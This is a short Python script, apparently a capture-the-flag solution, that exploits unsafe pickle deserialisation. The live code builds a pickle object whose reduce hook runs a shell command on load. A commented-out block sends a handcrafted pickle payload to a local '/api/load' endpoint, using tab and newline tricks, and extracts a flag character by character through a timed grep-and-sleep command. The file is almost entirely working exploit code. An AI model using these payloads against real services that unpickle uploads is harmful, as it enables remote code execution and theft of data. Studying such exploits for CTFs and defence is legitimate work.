import io
import pickle
import os


class RCE:
    def __reduce__(self):
        return os.system, ("ls",)


memory_stream = io.BytesIO()
# print(memory_stream)
# file_io = io.BytesIO("")
# print(file_io)
pickle.dump(RCE(), memory_stream)

print(memory_stream.getvalue())
file_io = io.BytesIO(memory_stream.getvalue())

pickle.load(file_io)

# import requests
# import string
# import time

# string = string.ascii_letters + string.digits + "}@!_"
# flag = ""
# url = "http://localhost:11111"

# flag = "ISITDTU{"


# while "}" not in flag:
#     for j in string:
#         # \x0a = \n and \x09 = tab
#         print(j, end="\r")
#         data = f'''(cos\x0asystem\x0aS'if\x09grep\x09-q\x09"^{flag+j}"\x09f*;then\x09sleep\x094;fi'\x0ao'''
#         start = time.time()
#         r = requests.post(url + "/api/load",
#                           files={"file": ('file.pkl', data)})
#         print(r.text)
#         end = time.time()
#         if end - start > 3:
#             flag += j
#             print(flag)
#             break
